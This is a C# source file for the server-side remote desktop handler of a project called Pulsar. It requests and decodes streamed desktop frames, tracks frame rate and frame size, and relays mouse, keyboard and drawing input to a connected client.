using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.Video.Codecs;
using Pulsar.Server.Networking;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote desktop.
    /// </summary>
    public class RemoteDesktopHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming desktop frames.
        /// </summary>
        public bool IsStarted { get; private set; }

        /// <summary>
        /// Gets or sets whether the remote desktop is using buffered mode.
        /// </summary>
        public bool IsBufferedMode { get; set; } = true;

        private readonly object _syncLock = new object();
        private readonly object _sizeLock = new object();

        private Size _localResolution;

        /// <summary>
        /// Local resolution used to scale mouse/drawing coordinates.
        /// Thread-safe.
        /// </summary>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        public delegate void DisplaysChangedEventHandler(object sender, int value);

        /// <summary>
        /// Raised when the client display configuration changes.
        /// </summary>
        public event DisplaysChangedEventHandler? DisplaysChanged;

        private void OnDisplaysChanged(int value)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = DisplaysChanged;
                handler?.Invoke(this, (int)val!);
            }, value);
        }

        private readonly Client _client;
        private UnsafeStreamCodec? _codec;

        // Buffered frame request logic
        private readonly int _initialFramesRequested = 20;
        private readonly int _defaultFrameRequestBatch = 15;
        private int _pendingFrames;
        private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);

        // Stats / FPS
        private readonly Stopwatch _performanceMonitor = new Stopwatch();
        private int _framesReceivedForStats;
        private double _estimatedFps;
        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
        private readonly int _fpsCalculationWindow = 10;

        private long _accumulatedFrameBytes;
        private int _frameBytesSamples;
        private long _lastFrameBytes;

        /// <summary>
        /// Size in bytes of the most recently received compressed frame.
        /// </summary>
        public long LastFrameSizeBytes => Interlocked.Read(ref _lastFrameBytes);

        /// <summary>
        /// Average compressed frame size in bytes across the current streaming session.
        /// </summary>
        public double AverageFrameSizeBytes
        {
            get
            {
                long total = Interlocked.Read(ref _accumulatedFrameBytes);
                int count = Volatile.Read(ref _frameBytesSamples);
                return count > 0 ? (double)total / count : 0.0;
            }
        }

        private float _lastReportedFps = -1f;

        /// <summary>
        /// Current FPS: prefers client-reported, falls back to estimated FPS.
        /// </summary>
        public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;

        public RemoteDesktopHandler(Client client) : base(true)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
            _performanceMonitor.Start();
        }

        public override bool CanExecute(IMessage message) =>
            message is GetDesktopResponse || message is GetMonitorsResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            try
            {
                switch (message)
                {
                    case GetDesktopResponse d:
                        Execute(sender, d);
                        break;
                    case GetMonitorsResponse m:
                        Execute(sender, m);
                        break;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"RemoteDesktopHandler.Execute error: {ex}");
            }
        }

        private void ClearTimeStamps()
        {
            while (_frameTimestamps.TryDequeue(out _)) { }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        public void BeginReceiveFrames(int quality, int display, bool useGPU)
        {
            lock (_syncLock)
            {
                IsStarted = true;

                _codec?.Dispose();
                _codec = null;

                _pendingFrames = _initialFramesRequested;
                ClearTimeStamps();
                _framesReceivedForStats = 0;
                _performanceMonitor.Restart();
            }

            _client.Send(new GetDesktop
            {
                CreateNew = true,
                Quality = quality,
                DisplayIndex = display,
                Status = RemoteDesktopStatus.Start,
                UseGPU = useGPU,
                IsBufferedMode = IsBufferedMode,
                FramesRequested = _initialFramesRequested
            });
        }

        /// <summary>
        /// Ends receiving frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            lock (_syncLock)
            {
                IsStarted = false;
            }

            Debug.WriteLine("Remote desktop session stopped");
            _client.Send(new GetDesktop { Status = RemoteDesktopStatus.Stop });
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshDisplays()
        {
            Debug.WriteLine("Refreshing displays");
            _client.Send(new GetMonitors());
        }

        public void SendMouseEvent(MouseAction mouseAction, bool isMouseDown, int x, int y, int displayIndex)
        {
            UnsafeStreamCodec? codec;
            Size localRes;

            lock (_syncLock)
            {
                codec = _codec;
            }

            if (codec == null)
                return;

            localRes = LocalResolution;
            if (localRes.Width <= 0 || localRes.Height <= 0)
                return;

            int remoteX = x * codec.Resolution.Width / localRes.Width;
            int remoteY = y * codec.Resolution.Height / localRes.Height;

            _client.Send(new DoMouseEvent
            {
                Action = mouseAction,
                IsMouseDown = isMouseDown,
                X = remoteX,
                Y = remoteY,
                MonitorIndex = displayIndex
            });
        }

        public void SendKeyboardEvent(byte keyCode, bool keyDown)
        {
            _client.Send(new DoKeyboardEvent { Key = keyCode, KeyDown = keyDown });
        }

        public void SendDrawingEvent(int x, int y, int prevX, int prevY,
            int strokeWidth, int colorArgb, bool isEraser, bool isClearAll, int displayIndex)
        {
            UnsafeStreamCodec? codec;
            Size localRes;

            lock (_syncLock)
            {
                codec = _codec;
            }

            if (codec == null || !IsStarted)
                return;

            localRes = LocalResolution;
            if (localRes.Width <= 0 || localRes.Height <= 0)
                return;

            int remoteX = x * codec.Resolution.Width / localRes.Width;
            int remoteY = y * codec.Resolution.Height / localRes.Height;
            int remotePrevX = prevX * codec.Resolution.Width / localRes.Width;
            int remotePrevY = prevY * codec.Resolution.Height / localRes.Height;

            _client.Send(new DoDrawingEvent
            {
                X = remoteX,
                Y = remoteY,
                PrevX = remotePrevX,
                PrevY = remotePrevY,
                StrokeWidth = strokeWidth,
                ColorArgb = colorArgb,
                IsEraser = isEraser,
                IsClearAll = isClearAll,
                MonitorIndex = displayIndex
            });
        }

        private async Task ForceFrameRequestFallbackAsync()
        {
            if (!IsStarted) return;

            if (!await _frameRequestSemaphore.WaitAsync(0).ConfigureAwait(false))
                return;

            try
            {
                int batch = _defaultFrameRequestBatch;

                Debug.WriteLine($"[Failsafe] Requesting {batch} frames (pending stuck).");

                Interlocked.Add(ref _pendingFrames, batch);

                _client.Send(new GetDesktop
                {
                    CreateNew = false,
                    Quality = _codec?.ImageQuality ?? 75,
                    DisplayIndex = _codec?.Monitor ?? 0,
                    Status = RemoteDesktopStatus.Continue,
                    IsBufferedMode = true,
                    FramesRequested = batch
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failsafe request error: {ex}");
            }
            finally
            {
                _frameRequestSemaphore.Release();
            }
        }

        // ==============================
        //   MAIN FRAME HANDLER
        // ==============================
        private void Execute(ISender client, GetDesktopResponse message)
        {
            // Fast exit if stream stopped
            if (!IsStarted)
                return;

            // FPS from client
            if (message.FrameRate > 0 && Math.Abs(message.FrameRate - _lastReportedFps) > 0.01f)
            {
                _lastReportedFps = message.FrameRate;
                Debug.WriteLine($"Client-reported FPS updated: {_lastReportedFps}");
            }

            // Account frame size stats (compressed)
            if (message.Image != null && message.Image.Length > 0)
            {
                long size = message.Image.LongLength;
                Interlocked.Exchange(ref _lastFrameBytes, size);
                Interlocked.Add(ref _accumulatedFrameBytes, size);
                Interlocked.Increment(ref _frameBytesSamples);
            }

            UnsafeStreamCodec? codecSnapshot;
            bool shouldDecode;

            lock (_syncLock)
            {
                // Validate incoming image
                if (!IsStarted || message.Image == null || message.Image.Length == 0)
                {
                    Interlocked.Decrement(ref _pendingFrames);
                    return;
                }

                // Recreate codec if necessary
                if (_codec == null ||
                    _codec.ImageQuality != message.Quality ||
                    _codec.Monitor != message.Monitor ||
                    _codec.Resolution != message.Resolution)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                    Debug.WriteLine($"RemoteDesktop codec reinitialized: Q={message.Quality}, M={message.Monitor}, Res={message.Resolution}");
                }

                codecSnapshot = _codec;
                shouldDecode = codecSnapshot != null;
            }

            if (!shouldDecode || codecSnapshot == null)
            {
                Interlocked.Decrement(ref _pendingFrames);
                return;
            }

            Bitmap? decoded = null;

            try
            {
                using (var ms = new MemoryStream(message.Image, writable: false))
                {
                    decoded = codecSnapshot.DecodeData(ms);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error decoding frame: {ex.Message}");
            }
            finally
            {
                // allow GC to reclaim buffer
                message.Image = null;
            }

            if (!IsStarted)
            {
                decoded?.Dispose();
                Interlocked.Decrement(ref _pendingFrames);
                return;
            }

            if (decoded != null)
            {
                EnsureLocalResolutionInitialized(decoded.Size);

                // Count frame for stats
                _framesReceivedForStats++;
                if (_performanceMonitor.ElapsedMilliseconds >= 1000)
                {
                    double seconds = _performanceMonitor.ElapsedMilliseconds / 1000.0;
                    if (seconds > 0.001)
                    {
                        _estimatedFps = _framesReceivedForStats / seconds;
                    }

                    Debug.WriteLine(
                        $"Estimated FPS: {_estimatedFps:F1}, Client FPS: {(_lastReportedFps > 0 ? _lastReportedFps.ToString("F1") : "N/A")}, Frames (stat window): {_framesReceivedForStats}");

                    _framesReceivedForStats = 0;
                    _performanceMonitor.Restart();
                }

                // Track timestamps lightly (you can expand if you want window-based FPS)
                long ts = Stopwatch.GetTimestamp();
                _frameTimestamps.Enqueue(ts);
                while (_frameTimestamps.Count > _fpsCalculationWindow &&
                       _frameTimestamps.TryDequeue(out _)) { }

                // Push frame to UI
                OnReport(decoded);
            }
            else
            {
                Debug.WriteLine("Decoded frame was null.");
            }

            // Decrease pending (may hit 0)
            Interlocked.Decrement(ref _pendingFrames);

            // -------------------------------
            // FAILSAFE: Never allow streaming to stall
            // -------------------------------
            if (IsStarted && Volatile.Read(ref _pendingFrames) <= 0)
            {
                Debug.WriteLine("Failsafe triggered: pendingFrames <= 0, requesting frames.");
                _ = ForceFrameRequestFallbackAsync();
            }

            // -------------------------------
            // Normal buffered mode request logic
            // -------------------------------
            if (IsBufferedMode &&
                (message.IsLastRequestedFrame || Volatile.Read(ref _pendingFrames) <= 8))
            {
                _ = RequestMoreFramesAsync();
            }
        }

        private void EnsureLocalResolutionInitialized(Size fallbackSize)
        {
            if (fallbackSize.Width <= 0 || fallbackSize.Height <= 0)
                return;

            var current = LocalResolution;
            if (current.Width <= 0 || current.Height <= 0)
            {
                LocalResolution = fallbackSize;
            }
        }

        /// <summary>
        /// Requests more frames in buffered mode.
        /// Runs fully async and never blocks the UI thread.
        /// </summary>
        private async Task RequestMoreFramesAsync()
        {
            if (!IsStarted)
                return;

            if (!await _frameRequestSemaphore.WaitAsync(10).ConfigureAwait(false))
                return;

            try
            {
                if (!IsStarted)
                    return;

                int batchSize = _defaultFrameRequestBatch;

                // Simple adaptive batching based on estimated FPS
                double fps = _estimatedFps;
                if (fps > 40)
                    batchSize = 20;
                else if (fps > 30)
                    batchSize = 15;
                else if (fps > 20)
                    batchSize = 10;
                else if (fps > 10)
                    batchSize = 5;
                else
                    batchSize = 3;

                UnsafeStreamCodec? codecSnapshot;
                lock (_syncLock)
                {
                    codecSnapshot = _codec;
                }

                int quality = codecSnapshot?.ImageQuality ?? 75;
                int monitor = codecSnapshot?.Monitor ?? 0;

                Debug.WriteLine($"Requesting {batchSize} more frames (estimated FPS: {fps:F1})");
                Interlocked.Add(ref _pendingFrames, batchSize);

                _client.Send(new GetDesktop
                {
                    CreateNew = false,
                    Quality = quality,
                    DisplayIndex = monitor,
                    Status = RemoteDesktopStatus.Continue,
                    IsBufferedMode = true,
                    FramesRequested = batchSize
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"RequestMoreFramesAsync error: {ex}");
            }
            finally
            {
                _frameRequestSemaphore.Release();
            }
        }

        private void Execute(ISender client, GetMonitorsResponse message)
        {
            OnDisplaysChanged(message.Number);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposing)
                return;

            lock (_syncLock)
            {
                IsStarted = false;

                try
                {
                    _codec?.Dispose();
                }
                catch { }

                _codec = null;
            }

            try
            {
                _frameRequestSemaphore.Dispose();
            }
            catch { }
        }
    }
}
